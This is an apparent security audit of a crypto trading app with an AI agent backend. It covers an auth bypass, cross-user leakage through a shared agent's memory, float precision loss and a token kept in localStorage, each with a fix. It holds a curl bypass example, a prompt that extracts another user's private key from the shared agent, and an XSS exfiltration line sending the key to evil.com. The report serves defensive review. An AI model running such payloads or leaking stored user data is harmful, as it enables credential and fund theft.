# Security Deep Dive: The "Zero Trust" Audit

**Auditor:** Senior Engineer Hardcore Code Inquisitor
**Date:** 2024-05-22
**Focus:** Critical Vulnerability Exploitation Analysis

## 1. The Fake Authentication Bypass (CVE-Pending-Local-001)

### The Vulnerability
Located in `backend/main.py`, the `get_api_key` function performs a structural check but fails to perform an existential check.

```python
async def get_api_key(authorization: str = Header(None)) -> str:
    # ... checks "Bearer" prefix ...
    if not api_key:
        raise HTTPException(status_code=401, detail="API key is missing")

    # In a production environment, we would verify this key against a database.
    # For now, strict validation is enough.
    return api_key
```

### The Exploit
An attacker can access ANY protected endpoint by simply sending a header with a non-empty string.
`curl -H "Authorization: Bearer I_AM_HACKER" http://target/status` -> **200 OK**.

### Impact
Full unauthorized access to trading functions, wallet information, and agent controls.

### Remediation
1.  **Immediate:** Implement a hardcoded check against `os.getenv("API_KEY")`.
2.  **Robust:** Implement a database lookup for the API key.
3.  **Correct:** Use `passlib` to hash keys and verify hashes.

## 2. Global State Leakage (The "Party Line" Bug)

### The Vulnerability
In `backend/agents.py`, the `crypto_trading_team` is initialized as a global singleton.
In `backend/main.py`, this singleton is called directly:

```python
crypto_trading_team.run(msg)
```

The `agno` framework's `Team` class stores conversation history (memory) in its instance if not explicitly managed via external session storage and unique session IDs. Since no `session_id` is passed, it likely defaults to a shared context or the singleton's internal state.

### The Exploit
1.  **User A:** "My private key is 0xABC..." (Stored in Team memory)
2.  **User B:** "What did the previous user say?" OR just "Summarize context."
3.  **Agent:** "The user provided a private key 0xABC..."

### Impact
**Catastrophic Privacy Breach.** All users share a single "brain". Cross-user data leakage is guaranteed.

### Remediation
1.  **Architecture:** Do not use a global `Team` instance.
2.  **Implementation:** Instantiate `Team` inside the `chat` endpoint for every request, OR pass a unique `session_id` (derived from the API Key) to `team.run(session_id=...)`.

## 3. Financial Precision Loss (The "Office Space" Bug)

### The Vulnerability
`backend/storage/sqlite.py` treats money as `REAL` (Float).

```python
"amount": float(trade.amount), # CAST DECIMAL TO FLOAT
```

IEEE 754 floating point numbers cannot accurately represent decimal fractions (e.g., 0.1).
`0.1 + 0.2 != 0.3` in floats.

### The Exploit
Over thousands of trades, the "rounding errors" accumulate.
In Crypto, where `1 wei = 0.000000000000000001 ETH`, casting to float (which has ~15-17 significant digits) **WILL** erase small balances or corrupt large precision calculations.

### Impact
Financial loss, reconciliation failure, and potential for arbitrage attacks if the system miscalculates prices.

### Remediation
1.  **Database:** Use `TEXT` or `NUMERIC` types in SQLite, or `DECIMAL` in Postgres.
2.  **Code:** NEVER cast to `float`. Use `decimal.Decimal` exclusively.

## 4. Frontend Security (XSS Vectors)

### The Vulnerability
`src/services/api.ts` stores the API Key in `localStorage`.

```typescript
localStorage.getItem("openaiApiKey");
```

### The Exploit
If an attacker can inject a script (via a compromised dependency, a malicious ad, or a reflected XSS in the error toaster), they can read `localStorage`.

```javascript
fetch('https://evil.com/steal', { body: localStorage.getItem('openaiApiKey') })
```

### Remediation
Store tokens in `httpOnly` cookies which cannot be accessed by JavaScript.
